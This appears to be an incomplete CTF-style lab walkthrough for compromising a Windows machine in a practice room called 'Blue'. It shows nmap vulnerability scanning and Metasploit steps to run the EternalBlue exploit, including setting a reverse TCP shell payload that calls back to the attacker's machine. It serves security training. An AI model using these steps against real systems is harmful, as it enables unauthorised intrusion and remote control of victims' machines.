# Blue

## Introduction
"Deploy & hack into a Windows machine, leveraging common misconfigurations issues."

## Tasks
1. Reconnaissance
    - scanning and enumeration
    - look for the machine's vulnerability
2. Gain Access
    - exploit the vulnerability via metasploit
3. Escalate
    - convert a shell to a meterpreter shell and gain escalated privileges
4. Cracking
    - crack the non-default user's pass
5. Find flags!

## Walkthrough
- Start the prvoided lab machine.
- To attack the machine, you can use the provided attacker machine or use a local/virtual machine via vpn.

---

### Reconnaissance
Command: `nmap -sV -vv --script=vuln [target IP]`
- `nmap` - a powerful tool for scanning and enumeration
- `sV` - service/version scan
- `vv` - show the process line by line
- `--script=vuln` - find the machine's vulnerability
- This command will show the target machine's listening ports/services, their versions, and vulnerabilities while showing the real-time process by line.

Determine how many ports under 1000 are open and what is the machine vulnerable to (ex: ms08-067).

### Gain access
1. Open Metasploit, a powerful tool for ethical hacking.
    - Command: `msfconsole`
2. Look for the exploitation code that you will run against the machine.
    - Command: `search [ms??-???]`
    - Look for the full path of code.
    - Hint: `eternalblue`
3. Use the exploitation code.
    - Command: `use exploit/path/of/the/code`
4. Show required values.
    - Command: `show options`
    - The fields with `Yes` are required values, in this case, `RHOSTS` and `LHOST`
5. Set the required values.
    - Command: `set [value] [IP]`
    - `RHOSTS` - the target machine
    - `LHOST` - the attacker machine
    - "Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target."
    - Command: `set payload windows/x64/shell/reverse_tcp`
6. Run the exploit.
    - Command: `run`
